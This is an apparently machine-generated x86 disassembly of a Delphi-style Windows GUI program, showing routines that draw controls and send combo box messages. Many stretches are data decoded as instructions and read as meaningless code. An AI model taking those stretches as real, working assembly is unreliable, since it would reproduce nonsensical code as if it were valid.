movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
pop esi
push 0xf
call GetSysColorBrush
push eax
lea eax [ ebp - 0x18 ]
push eax
mov eax [ ebp - 0x8 ]
push eax
call FillRect
sub_428b04
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_428b3f
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_428b46
retn
mov eax [ rw-data ]
call sub_4030f0
mov eax rw-data
call sub_403eac
sub_428f90
pop ecx
inc ebx
add [ eax ] al
add [ eax ] al
add [ ecx ] 0x0
add [ eax ] al
push ss
add [ edi ] al
inc ebp
outsb
popad
bound ebp [ ebp + 0x64 ]
mov eax 0x680041b5
add [ eax ] al
jmp [ edx + edi + 0x43 ]
sub_42a0d6
add [ eax ] al
add [ eax ] al
add [ eax + 0x1 ] al
sub eax 0x61540700
bound edx [ ebx + 0x74 ]
outsd
jo r-xdata
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx ] 0x0
add [ eax ] al
in al dx
inc edx
add [ eax + 0x39 ] dh
inc ebx
add [ eax + 0x1004339 ] ah
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x5404002e ] al
js r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f090032 ] al
outsb
add [ eax ] dl
inc eax
add [ edi ] dl
add bh bh
nop
cmp [ ebx ] al
add al 0x5a
inc ebx
add [ eax ] al
add [ eax ] al
add [ ecx ] 0x0
add [ eax ] al
das
add [ edi ] al
push esi
imul esi [ ebx + 0x69 ] 0x60656c62
push cs
inc ecx
add [ eax ] bl
add al [ eax ]
[ eax ]
add al [ eax ]
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f080030 ] al
outsb
inc ebx
push 0x65676e61
pushad
push cs
inc ecx
add [ eax ] ah
add [ eax ] eax
jmp [ eax ]
add [ eax ] al
xor [ 0x6e4f0a00 ] 0x44
jb r-xdata
push ebp
jo r-xdata
add [ eax - 0x80000000 ] al
cmp [ eax ] al
or cl [ edi + 0x6e ]
inc esp
jb r-xdata
inc esp
jb r-xdata
inc ebx
insb
outsd
jae r-xdata
add [ eax ] 0x0
add [ eax + 0x4f070031 ] al
outsb
inc ebx
insb
imul esp [ ebx + 0x6b ] r-xdata
xor [ edx ] al
add bh bh
xor [ edx ] al
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
xor al [ eax ]
or [ edi + 0x6e ] ecx
cmc
inc edx
add [ eax ] dh
add [ eax ] eax
push [ eax ]
add [ eax ] eax
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0e0033 ] al
outsb
inc ebx
outsd
outsb
je r-xdata
pushad
jo r-xdata
outsb
jo r-xdata
add [ eax ] al
js r-xdata
jns r-xdata
je r-xdata
inc ebp
outsb
inc esp
jb r-xdata
outsd
ja r-xdata
dec ebx
jns r-xdata
pushad
push cs
inc ecx
add al al
add [ eax ] eax
inc eax
add [ eax ] eax
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f07003b ] al
outsb
inc ebp
outsb
je r-xdata
add [ eax + 0x4f0a0036 ] al
outsb
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
inc ebp
outsb
inc esp
add [ eax - 0x80000000 ] al
cmp [ eax ] eax
dec edi
jbe r-xdata
inc esp
push eax
outsd
jo r-xdata
add [ eax ] eax
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0b0042 ] al
jo r-xdata
add [ eax ] eax
add [ eax ] al
add [ eax ] al
out dx eax
inc edx
add al bl
add [ eax ] eax
outsb
inc ebp
js r-xdata
enter 0x1 0xff
enter 0x1 0xff
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
cmp al 0x0
push es
dec edi
cmp cl dh
inc edx
add [ eax ] cl
add [ eax ] eax
dec [ eax ]
add [ eax ] eax
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f090039 ] al
outsb
outsb
dec ebx
jns r-xdata
outsd
ja r-xdata
jns r-xdata
jb r-xdata
or [ edi + 0x6e ] ecx
jb r-xdata
add [ eax ] 0x0
add [ eax + 0x4f09003a ] al
ja r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0a0037 ] al
outsb
inc esp
jb r-xdata
add al [ eax ]
inc [ eax + 0x1ff0002 ]
jo r-xdata
add [ eax ] al
or [ eax ] al
add [ eax ] al
and al 0xa4
jb r-xdata
inc esp
xchg esp eax
inc edx
add [ eax - 0x7700fffe ] cl
add al [ eax ]
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0d0040 ] al
outsb
dec ebp
popad
jae r-xdata
insd
pushad
push cs
int3
inc ecx
add [ eax ] ah
add al [ eax ]
jmp [ eax ]
jb r-xdata
outsb
dec ebx
jns r-xdata
push cs
inc ecx
add al cl
add [ eax ] eax
dec eax
add [ eax ] eax
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f06003c ] al
xchg esp eax
inc edx
add [ eax - 0x7f00fffe ] al
add al [ eax ]
inc [ ecx ]
outsd
arpl [ ebx + 0x38 ] bp
int1
inc edx
add [ eax ] bl
add [ eax ] eax
[ eax ]
add [ eax ] eax
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
je r-xdata
inc esp
jb r-xdata
xor [ esi ] 0x0
or cl [ edi + 0x6e ]
push cs
inc ecx
add [ eax ] ch
add [ eax ] eax
[ eax ]
or [ esp + edx * 2 ] cl
dec esp
imul ebp [ esi + 0x65 ] 0x730a7055
arpl [ ecx + ebp * 2 + 0x6e ] cx
inc esp
outsd
ja r-xdata
inc esp
outsd
arpl [ ebx - 0x10 ] bp
jo r-xdata
jb r-xdata
add [ eax ] cl
dec edi
outsb
push ebx
insb
jae r-xdata
outsb
dec edi
insd
pushad
push cs
inc ecx
add [ eax ] ch
add al [ eax ]
[ eax ]
add [ eax ] al
add [ esi ] dl
inc edx
add [ edx ] bh
cmpsb [ esi ] [ edi ]
inc edx
add [ eax ] bh
add al [ eax ]
add [ edi * 8 - 0x5d83ffbe ] cl
inc ecx
add [ ebx + esi ] ch
inc eax
add al dl
fwait
inc ecx
add [ ebx + esi ] dh
inc eax
add al ch
jl r-xdata
outsb
je r-xdata
push 0x65
or [ ebx + 0x63 ] dh
push eax
popad
push ebp
add eax 0x6d657449
jae r-xdata
inc ecx
add [ edx + eax ] bh
add bh bh
or al 0x1
add dh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
inc esp
add [ 0x6d657449 ] al
inc ebx
add [ ebx ] cl
dec ecx
je r-xdata
outsb
push ebx
je r-xdata
add bh bh
add [ ecx ] al
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
inc edx
add [ ebx ] cl
dec edi
sub bh 0x42
add al ch
add [ eax ] eax
inc ebx
add [ esp + ebp * 4 ] al
inc ebx
add [ esp + ebp - 0x5de7ffbd ] dh
inc ebx
add [ eax ] bh
mov [ 0xffffffff9f500043 ] al
add [ eax - 0x5bffbfd0 ] cl
xor [ eax ] al
rcr [ edi + 0x43 ] 0x0
mov [ ebx + eax * 2 + 0x4374b000 ] ch
add ecx [ eax ]
push es
push ebx
outsb
jb r-xdata
pop edi
inc ebx
add [ eax - 0x4fffbc54 ] cl
je r-xdata
insb
or dh [ ebx + 0x63 ]
push eax
outsd
jae r-xdata
jae r-xdata
arpl [ gs : eax + edi * 8 - 0xe ] si
inc edx
add [ eax ] al
add [ eax ] eax
inc [ eax ]
inc edx
add [ eax ] cl
jae r-xdata
sub [ edx + eax * 2 + 0x540b0300 ] ah
push ebx
arpl [ edx + 0x6f ] si
jo r-xdata
jb r-xdata
dec edi
outsb
push ebx
je r-xdata
or bh dl
add [ eax ] ch
rol [ edx ] cl
clc
jb r-xdata
push ebx
arpl [ edx + 0x6f ] si
insb
insb
inc ebx
outsd
or edx [ gs : ebx + edx * 2 + 0x63 ]
add [ edx ] cl
arpl [ eax + eax + 0xa ] si
push esp
dec edi
bound ebp [ edx + 0x65 ]
inc ebx
add ah bh
sub eax [ ebx ]
add [ ebx + eax * 2 ] ch
add [ esp + ebx * 2 ] dl
inc ebx
add [ eax + 0x5c ] al
inc ebx
add [ eax + 0x37 ] al
inc ebx
add [ eax + 0x2d ] bh
inc ebx
add ah cl
cmp [ ebx ] al
inc esp
cmp [ ebx ] al
pop eax
cmp eax [ ebx ]
add al 0x3a
inc ebx
add [ ebx + edi * 2 + 0x5cc40043 ] al
inc ebx
add [ edi + ebx * 4 - 0x5f9fffbd ] ah
inc ebx
add [ ebx + ebx * 4 + 0x43 ] bl
add [ esi + edi + 0x41 ] bl
add ah dh
adc [ eax ] al
and al 0xa4
inc edx
add [ eax + edx ] bh
dec ecx
outsb
je r-xdata
je r-xdata
arpl [ gs : eax + eax + 0xa ] si
push eax
outsd
outsb
pop es
jae r-xdata
inc esp
jb r-xdata
add [ eax + 0x43 ] al
add ah bl
popad
inc ebx
add [ eax + 0x68 ] dh
inc ebx
add [ eax ] dl
jbe r-xdata
inc eax
add [ esi + 0x42 ] cl
add [ edi ] al
or dl [ ebx + edx * 2 + 0x63 ]
jb r-xdata
inc edx
add [ ebp + edx * 8 - 0x2a37ffbe ] ah
inc edx
add [ edx ] cl
push esp
push ebx
arpl [ edx + 0x6f ] si
insb
insb
inc edx
popad
jb r-xdata
cmp bh dl
inc edx
add [ eax ] dl
xlat
inc edx
add [ eax ] bh
xlat
add [ edx + edx * 8 + 0x76a80042 ] ch
inc ebx
add [ esi + esi * 2 + 0x75640043 ] ch
inc ebx
add [ esi * 2 - 0x5e7bffbd ] cl
inc ebx
add [ edi + edi * 2 + 0x43 ] dl
add [ eax - 0x4d ] bl
inc ebx
add [ eax ] al
sahf
inc ebx
add al dh
mov al [ 0x60043 ]
adc al 0xbd
adc eax 0x14bd37bd
add [ ebx + 0xffb2ff ] dh
xlat
inc edx
add [ eax ] cl
xlat
add [ edx + ebx * 2 + 0x43 ] al
add [ eax + 0x2e ] al
inc ebx
add [ ecx + 0x43 ] ah
add [ eax + 0x37 ] bl
inc ebx
add [ edx - 0x6083ffbf ] dl
inc ecx
add [ edi + ebx * 4 + 0x41 ] dh
add [ edx - 0x2e8fffbf ] bl
inc edx
add [ edi - 0x5347ffbd ] bl
inc ecx
jb r-xdata
inc ebx
outsd
add [ gs : ecx ] ecx
push ebx
jb r-xdata
insb
push esp
jb r-xdata
popad
inc esp
outsd
ja r-xdata
jo r-xdata
add [ eax ] 0x0
add [ eax + 0x4208000d ] al
imul eax [ ecx + ebp * 2 + 0x4d ] 0xe865646f
in eax dx
insb
insb
inc edx
popad
jb r-xdata
hlt
arpl [ ebx + 0x5 ] bp
jae r-xdata
add bh bh
pushad
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
adc al [ eax ]
or [ edx + esi * 2 + 0x61 ] al
dec ebp
outsd
add [ gs : eax ] dl
jb r-xdata
or al 0x0
pop es
inc ecx
outsb
arpl [ eax + 0x6f ] bp
jb r-xdata
movsd [ edi ] [ esi ]
inc edx
add al al
add [ ebx ] al
xor [ eax ] eax
or [ ebx + 0x74 ] dl
inc ebx
je r-xdata
arpl [ edx + 0x6f ] si
insb
insb
push eax
push esp
outsd
jo r-xdata
adc [ eax ] eax
or [ edx + esi * 2 + 0x61 ] al
dec ebx
imul ebp [ esi + 0x64 ] r-xdata
pop ebp
add [ eax ] al
jmp [ eax ]
imul ebp [ esi + 0x74 ] 0x40100073
add [ ebp - 0x4f00ffff ] ah
mov [ 0xffffffffa2d40043 ] al
inc ebx
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4305000f ] al
je r-xdata
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0xc ] al
adc [ eax ] al
or al [ edx + esi * 2 + 0x61 ]
inc ebx
jne r-xdata
sbb [ 0x5f0041 ] cl
add bh bh
jo r-xdata
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x430b000e ] al
outsd
outsb
jae r-xdata
pop esi
inc ebx
insb
jae r-xdata
or esi [ ebx + 0x63 ]
inc ebp
outsb
push ebx
arpl [ edx + 0x6f ] si
insb
insb
or [ ebx + 0x74 ] dl
inc ebx
je r-xdata
jae r-xdata
inc eax
add [ eax ] dl
add dh bh
add [ fs : eax ] al
add [ gs : eax ] dl
xor eax [ eax + eax - 0x1a ]
inc edx
add [ edx ] bh
add bh bh
jpe r-xdata
dec [ eax + 0x10042d3 ]
jae r-xdata
inc edx
add [ eax + eax ] dh
[ esi + ebx * 2 + 0x43 ]
add dh bh
xchg esp eax
cmp al [ ebx ]
add [ eax ] al
add [ eax - 0x80000000 ] al
or eax 0x69420800
inc esp
imul ecx [ ebp + 0x6f ] 0xede86564
add [ eax ] al
inc esp
sub al 0x43
add [ eax + 0x2d ] ah
inc ebx
add [ eax ] al
add [ eax ] al
add [ ebx ] 0x0
add [ eax ] al
add [ eax ] bl
out 0x42 al
add [ ebx ] bl
add bh bh
test [ esi ] ch
inc ebx
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
or eax [ eax ]
add eax 0x67696c41
outsb
inc eax
in eax dx
inc edx
add [ ecx ] ah
add bh bh
les ebp [ ebx + eax * 2 ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
cmpsb [ esi ] [ edi ]
inc edx
insb
jae r-xdata
outsd
jae r-xdata
inc edx
outsd
je r-xdata
adc [ eax ] al
inc ebx
push 0x65676e61
cmp al 0x10
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
adc al 0x0
add al 0x4b
imul ebp [ esi + 0x64 ] r-xdata
and al [ edx ]
add bh bh
and al [ edx ]
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax + 0x1 ] al
adc eax 0x614c0b00
jb r-xdata
add bh bh
mov bl dl
inc edx
add [ ecx ] al
jb r-xdata
insb
insb
inc ebx
outsd
add [ gs : eax ] eax
add [ eax ] al
add [ eax ] cl
add [ eax ] al
add [ esp ] ah
push ebx
arpl [ edx + 0x6f ] si
insb
insb
inc ebp
jbe r-xdata
inc eax
add [ eax + 0x80042a4 ] ch
or al 0x54
inc eax
add [ ebp + 0x42 ] cl
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ esi + 0x42 ] cl
outsd
insd
pushad
add [ eax ] al
[ eax + eax ]
push ebx
imul edi [ edx + 0x65 ] r-xdata
adc [ eax ] al
adc [ edx ] al
add bh bh
js r-xdata
pop esp
in al dx
inc edx
add [ ebx - 0x64010000 ] bl
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
inc eax
add [ edx + eax ] dl
add bh bh
nop
aad 0x42
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
and [ eax + eax ] 0x0
push ss
add [ ebx ] al
dec ebp
popad
js r-xdata
outsb
cmp al 0x10
inc edx
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
pop ss
add [ ebx ] al
dec ebp
imul ebp [ esi + 0x3c ] 0x18004010
add al [ eax ]
jmp [ eax ]
sub_42ad2d
add [ eax ] al
add [ ebx + 0x53000408 ] ch
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
call sub_4361dc
mov edx [ ebx + 0x68 ]
mov eax [ ebx + 0x208 ]
call sub_41d9fc
mov edx r-xdata
mov eax [ ebx + 0x208 ]
call sub_41d958
add [ esi + 0x4 ] eax
push 0xffffffff
push 0xffffffff
push esi
call InflateRect
cmp [ ebx + 0x1a5 ] 0x0
je r-xdata
pop esi
pop ebx
retn
push 0xffffffff
push 0xffffffff
push esi
call InflateRect
sub_42ada0
push ebp
mov ebp esp
mov ecx 0x11
push 0x0
push 0x0
dec ecx
jne r-xdata
push ecx
push ebx
push esi
push edi
mov ebx eax
xor eax eax
push ebp
push sub_42b142
push [ fs : eax ]
mov [ fs : eax ] esp
mov edi [ ebx + 0x208 ]
mov edx [ ebx + 0x68 ]
mov eax edi
call sub_41d9fc
call sub_428284
call sub_428364
test al al
je r-xdata
mov edx r-xdata
mov eax edi
call sub_41d958
mov [ ebp - 0x4 ] eax
mov eax [ ebx + 0x4c ]
push eax
lea eax [ ebp - 0x1d ]
push eax
mov edx [ ebp - 0x4 ]
sar edx 0x1
jns r-xdata
lea edx [ ebp - 0x50 ]
mov eax ebx
call sub_433970
cmp [ ebp - 0x50 ] 0x0
je r-xdata
dec edx
mov ecx [ ebx + 0x48 ]
xor eax eax
call sub_41242c
cmp [ ebx + 0x1a5 ] 0x0
je r-xdata
adc edx 0x0
push 0x0
lea eax [ ebp - 0x2d ]
push eax
xor ecx ecx
xor edx edx
xor eax eax
call sub_41242c
lea eax [ ebp - 0xc ]
push eax
lea edx [ ebp - 0x54 ]
mov eax ebx
call sub_433970
mov eax [ ebp - 0x54 ]
call sub_40416c
push eax
lea edx [ ebp - 0x58 ]
mov eax ebx
call sub_433970
mov eax [ ebp - 0x58 ]
call sub_40436c
push eax
mov eax edi
call sub_41dadc
push eax
call GetTextExtentPoint32A
mov eax [ ebp - 0x8 ]
push eax
lea eax [ ebp - 0x2d ]
push eax
mov ecx [ ebp - 0xc ]
xor edx edx
xor eax eax
call sub_41242c
mov eax ebx
mov si 0xffc8
call sub_4032ec
test al al
jne r-xdata
mov edx 0xff000006
mov eax [ edi + 0x14 ]
call sub_41d324
inc [ ebp - 0x1d ]
inc [ ebp - 0x19 ]
mov edx 0xff000014
mov eax [ edi + 0x14 ]
call sub_41d324
lea edx [ ebp - 0x1d ]
mov eax edi
call sub_41d704
push 0xffffffff
push 0xffffffff
lea eax [ ebp - 0x1d ]
push eax
call OffsetRect
mov edx 0xff000010
mov eax [ edi + 0x14 ]
call sub_41d324
jmp r-xdata
mov [ ebp - 0x39 ] eax
mov eax [ ebp - 0x21 ]
push eax
mov eax [ ebp - 0x25 ]
push eax
mov eax [ ebp - 0x29 ]
push eax
mov eax [ ebp - 0x2d ]
push eax
mov eax edi
call sub_41dadc
push eax
call ExcludeClipRect
mov eax ebx
mov edx [ eax ]
call [ edx + 0x50 ]
test al al
je r-xdata
adc eax 0x0
push 0x0
mov eax [ ebx + 0x48 ]
sub eax 0x8
sub eax [ ebp - 0x25 ]
push eax
lea eax [ ebp - 0x2d ]
push eax
call OffsetRect
jmp r-xdata
push 0x0
push 0x8
lea eax [ ebp - 0x2d ]
push eax
call OffsetRect
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42b149
lea eax [ ebp - 0x8c ]
mov edx 0x5
call sub_403ed0
lea eax [ ebp - 0x68 ]
mov edx 0x2
call sub_403ed0
lea eax [ ebp - 0x60 ]
call sub_40458c
lea eax [ ebp - 0x5c ]
mov edx 0x4
call sub_403ed0
retn
mov eax ebx
mov si 0xffc8
call sub_4032ec
test al al
jne r-xdata
lea edx [ ebp - 0x1d ]
mov eax edi
call sub_41d704
lea edx [ ebp - 0x68 ]
mov eax ebx
call sub_433970
cmp [ ebp - 0x68 ] 0x0
je r-xdata
mov [ ebp - 0xd ] 0x1c
mov [ ebp - 0xd ] 0x1b
jmp r-xdata
lea edx [ ebp - 0x3d ]
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x44 ]
mov eax [ ebp - 0x21 ]
sub eax [ ebp - 0x29 ]
sar eax 0x1
jns r-xdata
mov eax [ ebp - 0x4 ]
push eax
lea eax [ ebp - 0x78 ]
push eax
lea edx [ ebp - 0x7c ]
mov eax ebx
call sub_433970
mov edx [ ebp - 0x7c ]
mov eax [ ebx + 0x208 ]
call sub_41d93c
push eax
mov eax [ ebp - 0x15 ]
pop edx
sub eax edx
sub eax 0x8
xor ecx ecx
xor edx edx
call sub_41242c
push edi
lea esi [ ebp - 0x78 ]
lea edi [ ebp - 0x1d ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
pop edi
mov eax [ ebp - 0x4 ]
push eax
lea eax [ ebp - 0x1d ]
push eax
xor ecx ecx
xor edx edx
mov eax 0x8
call sub_41242c
jmp r-xdata
lea edx [ ebp - 0x64 ]
mov eax ebx
call sub_433970
mov edx [ ebp - 0x64 ]
lea eax [ ebp - 0x60 ]
call sub_4046d8
mov eax [ ebp - 0x60 ]
push eax
lea eax [ ebp - 0x2d ]
push eax
push 0x0
push 0x0
mov eax edi
call sub_41dadc
push eax
call sub_428284
lea ecx [ ebp - 0x4c ]
pop edx
call sub_4284cc
jmp r-xdata
call sub_428284
lea ecx [ ebp - 0x4c ]
mov dl [ ebp - 0xd ]
call sub_428530
lea eax [ ebp - 0x3d ]
push eax
push 0x0
mov eax edi
call sub_41dadc
push eax
call sub_428284
lea ecx [ ebp - 0x4c ]
pop edx
call sub_428420
push 0x0
mov eax edi
call sub_41dadc
push eax
call SelectClipRgn
lea edx [ ebp - 0x5c ]
mov eax ebx
call sub_433970
cmp [ ebp - 0x5c ] 0x0
je r-xdata
mov edx 0x20
mov eax ebx
call sub_435c68
mov esi eax
mov eax esi
or eax 0x400
push eax
lea eax [ ebp - 0x1d ]
push eax
lea edx [ ebp - 0x80 ]
mov eax ebx
call sub_433970
mov eax [ ebp - 0x80 ]
call sub_40416c
push eax
lea edx [ ebp - 0x84 ]
mov eax ebx
call sub_433970
mov eax [ ebp - 0x84 ]
call sub_40436c
push eax
mov eax edi
call sub_41dadc
push eax
call DrawTextA
mov edx [ ebx + 0x70 ]
mov eax [ edi + 0x14 ]
call sub_41d324
push esi
lea eax [ ebp - 0x1d ]
push eax
lea edx [ ebp - 0x88 ]
mov eax ebx
call sub_433970
mov eax [ ebp - 0x88 ]
call sub_40416c
push eax
lea edx [ ebp - 0x8c ]
mov eax ebx
call sub_433970
mov eax [ ebp - 0x8c ]
call sub_40436c
push eax
mov eax edi
call sub_41dadc
push eax
call DrawTextA
sub_42b153
inc [ ecx ]
add [ eax ] al
add [ eax ] dh
add [ eax ] al
add [ ebp - 0x75 ] dl
in al dx
push 0x0
push ebx
push esi
push edi
mov edi edx
mov ebx eax
xor eax eax
push ebp
push sub_42b1ce
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x4 ]
mov eax ebx
call sub_433970
mov edx [ ebp - 0x4 ]
mov ax [ edi + 0x4 ]
call sub_44a56c
test al al
je r-xdata
mov edx edi
mov eax ebx
call sub_4395f4
mov eax ebx
mov si 0xffb8
call sub_4032ec
test al al
je r-xdata
mov eax ebx
call sub_43a6d0
mov [ edi + 0xc ] 0x1
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42b1d5
lea eax [ ebp - 0x4 ]
call sub_403eac
retn
sub_42b23c
push ebp
mov ebp esp
push 0x0
push ebx
push esi
push edi
mov edi edx
mov ebx eax
xor eax eax
push ebp
push sub_42b2a2
push [ fs : eax ]
mov [ fs : eax ] esp
push 0x0
push edi
push 0x150
mov eax [ ebx + 0x10 ]
call sub_43a170
push eax
call SendMessageA
mov esi eax
cmp esi 0xffffffff
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42b2a9
lea eax [ ebp - 0x4 ]
call sub_403eac
retn
lea edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_4059ac
mov edx [ ebp - 0x4 ]
mov ecx edi
mov eax ebx
call sub_414830
sub_42b2b4
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
push edi
push esi
push 0x151
mov eax [ ebx + 0x10 ]
call sub_43a170
push eax
call SendMessageA
pop edi
pop esi
pop ebx
retn
sub_42b2d8
push ebx
push esi
push edi
mov esi ecx
mov edi edx
mov ebx eax
push 0x0
push edi
push 0x149
mov eax [ ebx + 0x10 ]
call sub_43a170
push eax
call SendMessageA
cmp eax 0xffffffff
je r-xdata
mov eax esi
xor edx edx
call sub_4044f8
mov edx esi
xchg edx eax
call sub_4044f8
mov eax [ esi ]
call sub_40436c
push eax
push edi
push 0x148
mov eax [ ebx + 0x10 ]
call sub_43a170
push eax
call SendMessageA
jmp r-xdata
pop edi
pop esi
pop ebx
retn
sub_42b330
push ebp
mov ebp esp
push 0x0
push ebx
mov ebx eax
xor eax eax
push ebp
push sub_42b394
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x4 ]
mov eax [ ebx + 0x10 ]
call sub_433970
push 0x0
push 0x0
push 0x14b
mov eax [ ebx + 0x10 ]
call sub_43a170
push eax
call SendMessageA
mov edx [ ebp - 0x4 ]
mov eax [ ebx + 0x10 ]
call sub_4339a0
mov eax [ ebx + 0x10 ]
mov edx [ eax ]
call [ edx + 0x88 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42b39b
lea eax [ ebp - 0x4 ]
call sub_403eac
retn
sub_42b3a0
push ebx
push esi
mov esi edx
mov ebx eax
push 0x0
push esi
push 0x144
mov eax [ ebx + 0x10 ]
call sub_43a170
push eax
call SendMessageA
pop esi
pop ebx
retn
sub_42b3c0
push ebx
push esi
mov esi edx
mov ebx eax
mov eax esi
call sub_40436c
push eax
push 0xffffffff
push 0x158
mov eax [ ebx + 0x10 ]
call sub_43a170
push eax
call SendMessageA
pop esi
pop ebx
retn
sub_42b3e8
push ebx
push esi
mov ebx edx
mov esi eax
push 0x0
mov eax ebx
xor al 0x1
and eax 0x7f
push eax
push 0xb
mov eax [ esi + 0x10 ]
call sub_43a170
push eax
call SendMessageA
xor bl 0x1
test bl bl
je r-xdata
pop esi
pop ebx
retn
mov eax [ esi + 0x10 ]
call sub_433eac
sub_42b41c
push ebp
mov ebp esp
push 0x0
push ebx
push esi
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_42b48f
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax esi
call sub_40436c
push eax
push 0x0
push 0x143
mov eax [ ebx + 0x10 ]
call sub_43a170
push eax
call SendMessageA
mov ebx eax
test ebx ebx
jge r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42b496
lea eax [ ebp - 0x4 ]
call sub_403eac
retn
lea edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_4059ac
mov ecx [ ebp - 0x4 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b1c0
call sub_403864
sub_42b4a0
push ebp
mov ebp esp
push 0x0
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_42b513
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax edi
call sub_40436c
push eax
push esi
push 0x14a
mov eax [ ebx + 0x10 ]
call sub_43a170
push eax
call SendMessageA
test eax eax
jge r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42b51a
lea eax [ ebp - 0x4 ]
call sub_403eac
retn
lea edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_4059ac
mov ecx [ ebp - 0x4 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b1c0
call sub_403864
sub_42b520
push ebp
mov ebp esp
push ecx
push ebx
push esi
test dl dl
je r-xdata
mov [ ebp - 0x1 ] dl
mov ebx eax
xor edx edx
mov eax ebx
call sub_435e9c
mov eax [ rw-data ]
cmp [ eax ] 0x0
je r-xdata
add esp 0xfffffff0
call sub_4033fc
mov eax [ r-xdata ]
mov [ ebx + 0x50 ] eax
mov eax [ r-xdata ]
mov [ ebx + 0x50 ] eax
jmp r-xdata
mov eax ebx
pop esi
pop ebx
pop ecx
pop ebp
retn
call sub_403454
pop [ fs : 0x0 ]
add esp 0xc
mov edx 0x91
mov eax ebx
call sub_43312c
mov edx 0x19
mov eax ebx
call sub_433150
mov dl 0x1
mov eax ebx
call sub_43a3a4
xor edx edx
mov eax ebx
call sub_433b34
mov dl 0x1
mov eax [ r-xdata ]
call sub_41d474
mov esi eax
mov [ ebx + 0x208 ] esi
mov eax esi
mov edx ebx
call sub_43254c
mov [ ebx + 0x238 ] 0x10
push ebx
push sub_42b8c4
call sub_41ab9c
mov [ ebx + 0x24c ] eax
push ebx
push sub_42b9bc
call sub_41ab9c
mov [ ebx + 0x254 ] eax
mov [ ebx + 0x210 ] 0x8
mov [ ebx + 0x214 ] 0xffffffff
mov [ ebx + 0x260 ] 0xffffffff
mov eax ebx
cmp [ ebp - 0x1 ] 0x0
je r-xdata
sub_42b614
push ebx
push esi
call sub_403464
mov ebx edx
mov esi eax
mov eax esi
call sub_43a474
test al al
je r-xdata
mov eax [ esi + 0x254 ]
call sub_44a488
mov eax [ esi + 0x24c ]
call sub_44a488
mov eax [ esi + 0x208 ]
